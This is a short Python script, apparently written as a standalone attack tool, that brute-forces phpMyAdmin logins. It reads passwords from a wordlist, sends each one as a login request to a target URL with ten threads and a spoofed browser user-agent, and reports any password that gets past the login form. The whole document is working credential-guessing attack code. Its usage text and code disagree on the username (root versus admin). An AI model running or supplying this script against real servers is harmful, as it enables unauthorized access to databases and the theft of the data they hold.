#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: IcySun
# 脚本功能：暴力破解phpMyadmin密码

import queue
import threading,sys
import requests
with open('password.txt','rb') as f:
    passlist = f.readlines()
def use():
    print ('#' * 50)
    print ('\t Crack Phpmyadmin root\'s pass')
    print ('\t\t\t Code By: IcySun')
    print ('\t python crackPhpmyadmin.py http://xx.com/phpmyadmin/ \n\t    (default user is root)')

    print ('#' * 50)

def crack(password):
    global url
    payload = {'pma_username': 'admin' ,'pma_password': password}
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
    r = requests.post(url, headers = headers, data = payload)
    if 'name="login_form"' .encode('utf-8') not in r.content:
        print ('[*] OK! Have Got The Pass ==> %s' % password)

class MyThread(threading.Thread): 
    def __init__(self): 
        threading.Thread.__init__(self) 
    def run(self): 
        global queue 
        while not queue.empty(): 
            password = queue.get() 
            crack(password)

def main():
    global url,password,queue
    queue = queue.Queue()
    url = sys.argv[1]
    for password in passlist:
        password = password.strip()
        queue.put(password)

    for i in range(10): 
        c = MyThread() 
        c.start()

if __name__ == '__main__':
    if len(sys.argv) != 2 :
        use()
    else:
        main()
